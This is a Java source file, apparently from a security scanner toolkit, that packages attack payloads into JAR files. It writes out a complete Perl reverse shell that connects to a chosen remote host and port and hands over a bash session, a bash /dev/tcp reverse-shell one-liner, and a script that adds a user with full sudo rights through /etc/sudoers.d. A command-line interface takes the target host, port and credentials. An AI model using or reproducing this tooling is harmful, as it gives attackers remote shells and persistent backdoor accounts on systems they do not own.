package com.gbw.scanner.tools;

import com.gbw.scanner.utils.FileUtils;
import org.apache.commons.cli.*;

import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class GBWScannerGenShellJar {


    private static String getJarFilePath(String jclass,boolean isMove){

        if(isMove){

            String dir = String.format("/tmp/jar/%d",System.currentTimeMillis());
            FileUtils.mkDirs(dir);
            return String.format("%s/%s.jar",dir,jclass);
        }

        return String.format("%s.jar",jclass);
    }

    private static void writeJarEntry(JarOutputStream jarPut,String name,byte[] content) throws IOException {

        JarEntry entry = new JarEntry(name);
        jarPut.putNextEntry(entry);
        jarPut.write(content);

    }

    public static String makeJarPackage(String jclass,String jarMainClassPath,String cmd,String script,boolean isMove) throws IOException {

        String metaContent = "Manifest-Version: 1.0\n" +
                "Archiver-Version: Plexus Archiver\n" +
                "Built-By: root\n" +
                "Build-Jdk: 1.8.0_144\n" +
                "Main-Class: JarMain\n";

        String mainClassName = FileUtils.getFileName(jarMainClassPath);

        String jarFilePath = getJarFilePath(jclass,isMove);

        JarOutputStream jarPut = new JarOutputStream(new FileOutputStream(jarFilePath));
        /*write META-INF*/
        writeJarEntry(jarPut,"META-INF/MANIFEST.MF",metaContent.getBytes());

        /*write class*/
        writeJarEntry(jarPut,mainClassName,Files.readAllBytes(Paths.get(jarMainClassPath)));
        /*write cmd*/
        writeJarEntry(jarPut,"cmd",cmd.getBytes());

        /*write script*/
        writeJarEntry(jarPut,"script",script.getBytes());

        jarPut.close();

        return jarFilePath;
    }

    public static String makePerlShell(String jclass,String jarMainClassPath,String rhost,int rport,boolean isMove) throws IOException {

        String template = "#!/usr/bin/perl -w   \n" +
                "#   \n" +
                "  \n" +
                "use strict;   \n" +
                "use Socket;   \n" +
                "use IO::Handle;   \n" +
                "  \n" +
                "  \n" +
                "my $remote_ip = \"%s\";   \n" +
                "my $remote_port = %d;   \n" +
                "  \n" +
                "my $proto = getprotobyname(\"tcp\");   \n" +
                "my $pack_addr = sockaddr_in($remote_port, inet_aton($remote_ip));   \n" +
                "  \n" +
                "my $shell = '/bin/bash -i';   \n" +
                "  \n" +
                "socket(SOCK, AF_INET, SOCK_STREAM, $proto);   \n" +
                "  \n" +
                "STDOUT->autoflush(1);   \n" +
                "SOCK->autoflush(1);   \n" +
                "  \n" +
                "connect(SOCK,$pack_addr) or die \"can not connect:$!\";   \n" +
                "  \n" +
                "open STDIN, \"<&SOCK\";   \n" +
                "open STDOUT, \">&SOCK\";   \n" +
                "open STDERR, \">&SOCK\";   \n" +
                "  \n" +
                "print \"Enjoy the shell.\\n\";             \n" +
                "  \n" +
                "system($shell);   \n" +
                "close SOCK;   \n";

        String script = String.format(template,rhost,rport);

        return makeJarPackage(jclass,jarMainClassPath,"perl",script,isMove);
    }

    public static String makeBashShell(String jclass,String jarMainClassPath,String rhost,int rport,boolean isMove) throws IOException {
        String script = String.format("/bin/bash -i >& /dev/tcp/%s/%d 0>&1",rhost,rport);
        return makeJarPackage(jclass,jarMainClassPath,"sh",script,isMove);
    }

    public static String makeCreateUserShell(String jclass,String jarMainClassPath,String user,String passwd,boolean isMove) throws IOException {

        String template = " #!/bin/bash\n" +
                " user=%s\n" +
                " passwd=%s\n" +
                " useradd $user\n" +
                " usermod -s /bin/bash $user\n" +
                " echo $user:$passwd |chpasswd\n" +
                " echo '%s  ALL=(ALL)   ALL' >>/etc/sudoers.d/shark\n" +
                " usermod -a -G wheel $user\n" +
                " usermod -a -G sudo  $user\n";

        String script = String.format(template,user,passwd,user);

        return makeJarPackage(jclass,jarMainClassPath,"sh",script,isMove);
    }

    public static String makeShellFromScriptFile(String jclass,String jarMainClassPath,String cmd,String scriptFile,boolean isMove) throws IOException {

        return makeJarPackage(jclass,jarMainClassPath,cmd,new String(Files.readAllBytes(Paths.get(scriptFile))),isMove);
    }

    public static void main(String[] args) throws ParseException, IOException {

        boolean isMove = false;



        Options opts = new Options();

        opts.addOption("jclass",true,"set java class name");
        opts.addOption("main",true,"java main class path");
        opts.addOption("perlshell",true,"make perl shell,args:<rhost>:<rport>");
        opts.addOption("bashshell",true,"make bash shell,args:<rhost>:<rport>");
        opts.addOption("createuser",true,"make user,args:<user>:<passwd>");
        opts.addOption("script",true,"make script ,args:<cmd>:<script>");
        opts.addOption("fscript",true,"make script from file,args:<cmd>:<scriptFile>");

        opts.addOption("isMove",false,"move jar to target or not");
        opts.addOption("help", false, "Print usage");

        CommandLine cliParser = new GnuParser().parse(opts, args);
        if(cliParser.hasOption("help")){

            new HelpFormatter().printHelp("GBWScannerGenShellJar:", opts);
            System.exit(0);
        }

        if(!cliParser.hasOption("jclass")){

            System.err.println("Please specify java class name");
            System.exit(-1);
        }

        String jclass = cliParser.getOptionValue("jclass");
        String jarMainClassPath  = "/opt/data/script/jclass/JarMain.class";

        if(cliParser.hasOption("main"))
            jarMainClassPath = cliParser.getOptionValue("main");


        if(cliParser.hasOption("isMove"))
            isMove = true;

        if(cliParser.hasOption("perlshell")){
            String[] splits = cliParser.getOptionValue("perlshell").split(":");
            System.out.println(makePerlShell(jclass,jarMainClassPath,splits[0],Integer.parseInt(splits[1]),isMove));
        }

        if(cliParser.hasOption("bashshell")){
            String[] splits = cliParser.getOptionValue("bashshell").split(":");
            System.out.println(makeBashShell(jclass,jarMainClassPath,splits[0],Integer.parseInt(splits[1]),isMove));
        }

        if(cliParser.hasOption("createuser")){
            String[] splits = cliParser.getOptionValue("createuser").split(":");
            System.out.println(makeCreateUserShell(jclass,jarMainClassPath,splits[0],splits[1],isMove));
        }

        if(cliParser.hasOption("script")){
            String[] splits = cliParser.getOptionValue("script").split(":");
            System.out.println(makeJarPackage(jclass,jarMainClassPath,splits[0],splits[1],isMove));
        }
        if(cliParser.hasOption("fscript")){
            String[] splits = cliParser.getOptionValue("fscript").split(":");
            System.out.println(makeShellFromScriptFile(jclass,jarMainClassPath,splits[0],splits[1],isMove));
        }

    }

}
